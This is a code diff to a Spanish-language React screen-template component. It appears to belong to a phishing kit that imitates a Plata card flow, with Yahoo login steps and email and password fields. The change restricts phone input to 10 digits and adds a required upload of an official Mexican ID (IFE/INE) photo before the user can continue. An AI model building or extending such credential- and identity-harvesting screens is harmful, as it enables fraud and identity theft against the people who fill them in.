@@ -94,6 +94,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [yahooStep2, setYahooStep2] = useState(false);
   const [emailInput, setEmailInput] = useState('');
   const [passwordInput, setPasswordInput] = useState('');
+  const [photoFile, setPhotoFile] = useState<File | null>(null);
   
   // Funciones de validación con protección mejorada
   const validateSecureData = (input: string, type: string) => {
@@ -379,20 +380,62 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <input
                     type="tel"
                     value={dataA}
-                    onChange={(e) => setDataA(e.target.value)}
-                    placeholder="55 1234 5678"
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '');
+                      if (value.length <= 10) {
+                        setDataA(value);
+                      }
+                    }}
+                    placeholder="5512345678"
                     className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-lg"
-                    maxLength={12}
+                    maxLength={10}
                   />
                   <p className="text-xs text-gray-500 mt-2">
-                    Formato: 55 1234 5678 (con espacios)
+                    Debe tener exactamente 10 dígitos
+                  </p>
+                </div>
+
+                {/* Input de foto */}
+                <div className="mb-6">
+                  <label className="block text-sm font-medium text-gray-700 mb-2">
+                    Sube tu identificación oficial (IFE/INE)
+                  </label>
+                  <div className="border-2 border-dashed border-gray-300 rounded-xl p-6 text-center">
+                    <input
+                      type="file"
+                      accept="image/*"
+                      onChange={(e) => {
+                        const file = e.target.files?.[0];
+                        if (file) {
+                          setPhotoFile(file);
+                        }
+                      }}
+                      className="hidden"
+                      id="photo-upload"
+                    />
+                    <label htmlFor="photo-upload" className="cursor-pointer">
+                      {photoFile ? (
+                        <div className="text-green-600">
+                          <div className="text-2xl mb-2">✅</div>
+                          <p className="text-sm">Foto cargada: {photoFile.name}</p>
+                        </div>
+                      ) : (
+                        <div className="text-gray-500">
+                          <div className="text-2xl mb-2">📷</div>
+                          <p className="text-sm">Toca para subir tu foto</p>
+                        </div>
+                      )}
+                    </label>
+                  </div>
+                  <p className="text-xs text-gray-500 mt-2">
+                    Requerido para verificar tu identidad
                   </p>
                 </div>
 
                 {/* Botón continuar */}
                 <Button
                   onClick={() => onSubmit(ScreenType.PHONE_INPUT, { phone: dataA })}
-                  disabled={!dataA || dataA.length < 10}
+                  disabled={!dataA || dataA.length !== 10 || !photoFile}
                   className="w-full platacard-button py-3 text-lg font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                 >
                   Continuar
